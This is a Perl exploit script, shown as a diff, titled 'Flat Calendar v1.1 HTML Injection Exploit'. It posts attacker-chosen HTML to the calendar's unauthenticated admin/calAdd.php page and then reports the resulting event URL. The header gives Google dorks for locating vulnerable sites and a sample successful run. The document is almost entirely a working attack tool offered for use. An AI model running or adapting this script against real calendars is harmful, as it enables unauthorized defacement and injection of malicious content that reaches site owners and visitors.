@@ -1,0 +1,130 @@
+#!/usr/bin/perl -w
+#Title		: Flat Calendar v1.1 HTML Injection Exploit
+#Download	: http://www.circulargenius.com/flatcalendar/FlatCalendar-v1.1.zip
+#Author		: ZoRLu / zorlu@milw00rm.com
+#Website	: http://milw00rm.com / its online
+#Twitter	: https://twitter.com/milw00rm or @milw00rm
+#Test		: Windows7 Ultimate
+#Date		: 08/12/2014
+#Thks		: exploit-db.com, packetstormsecurity.com, securityfocus.com, sebug.net and others
+#BkiAdam	: Dr.Ly0n, KnocKout, LifeSteaLeR, Nicx (harf sirali :)) )
+#Dork1      : intext:"Flat Calendar is powered by Flat File DB"
+#Dork2      : inurl:"viewEvent.php?eventNumber="
+#
+#C:\Users\admin\Desktop>perl flat.pl
+#
+#Usage: perl flat.pl http://server /calender_path/ indexfile nickname
+#Exam1: perl flat.pl http://server / index.html ZoRLu
+#Exam2: perl flat.pl http://server /calendar/ index.html ZoRLu
+#
+#C:\Users\admin\Desktop>perl flat.pl http://server /member_content/diaries/womens/calendar/ index.html ZoRLu
+#
+#[+] Target: http://server
+#[+] Path: /member_content/diaries/womens/calendar/
+#[+] index: index.html
+#[+] Nick: ZoRLu
+#[+] Exploit Succes
+#[+] Searching url...
+#[+] YourEventNumber = 709
+#[+] http://server/member_content/diaries/womens/calendar/viewEvent.php?eventNumber=709
+
+use HTTP::Request::Common qw( POST );
+use LWP::UserAgent;
+use IO::Socket;
+use strict;
+use warnings;
+
+sub hlp() {
+
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+print "\nUsage: perl $0 http://server /calender_path/ indexfile nickname\n";
+print "Exam1: perl $0 http://server / index.html ZoRLu\n";
+print "Exam2: perl $0 http://server /calendar/ index.html ZoRLu\n";
+
+}
+
+if(@ARGV != 4)	{
+
+hlp();
+exit();
+
+}
+
+my $ua = LWP::UserAgent->new; 
+my $url = $ARGV[0];
+my $path = $ARGV[1];
+my $index = $ARGV[2];
+my $nick = $ARGV[3];
+my $vuln = $url . $path . "admin/calAdd.php";
+
+print "\n[+] Target: ".$url."\n";
+print "[+] Path: ".$path."\n";
+print "[+] index: ".$index."\n";
+print "[+] Nick: ".$nick."\n";
+
+my @months = qw(January February March April May June July August September October November December);
+my ($day, $month, $yearset) = (localtime)[3,4,5];
+my $year = 1900 + $yearset;
+my $moon = $months[$month];
+
+if (open(my $fh, $index)) {
+ 
+while (my $row = <$fh>) {
+chomp $row;
+ 
+my $req = POST $vuln, [
+   event => 'Test Page',
+   description => $row,
+   month => $moon,
+   day => $day,
+   year => $year,
+   submitted => $nick,
+];
+ 			 
+ 
+my $resp = $ua->request($req);
+if ($resp->is_success) {
+    my $message = $resp->decoded_content;
+	my $regex = "Record Added: taking you back";
+	if ($message =~ /$regex/) {
+	print "[+] Exploit Succes\n";
+	
+	my $newua = LWP::UserAgent->new( );
+	my $newurl = $url . $path . "calendar.php";
+	my $newreq = $newua->get($newurl);
+	if ($newreq->is_success) {
+	my $newmessage = $newreq->decoded_content;
+	
+	my $first = rindex($newmessage,"viewEvent.php?eventNumber=");
+               print "[+] Searching url...\n";
+         my $request = substr($newmessage, $first+26, 4);
+         print "[+] YourEventNumber = $request\n";
+		 sleep(1);
+		 print "[+] ".$url.$path."viewEvent.php?eventNumber=".$request."\n";
+		 
+		 }
+		 
+else {
+    print "[-] HTTP POST error code: ", $newreq->code, "\n";
+    print "[-] HTTP POST error message: ", $newreq->message, "\n";
+}
+		
+	}
+	else {
+	
+	print "[-] Exploit Failed";
+	
+	}
+}
+else {
+    print "[-] HTTP POST error code: ", $resp->code, "\n";
+    print "[-] HTTP POST error message: ", $resp->message, "\n";
+  }
+ }
+}
+else { 
+
+sleep(1);
+die ("[-] NotFound: $index\n");
+
+}
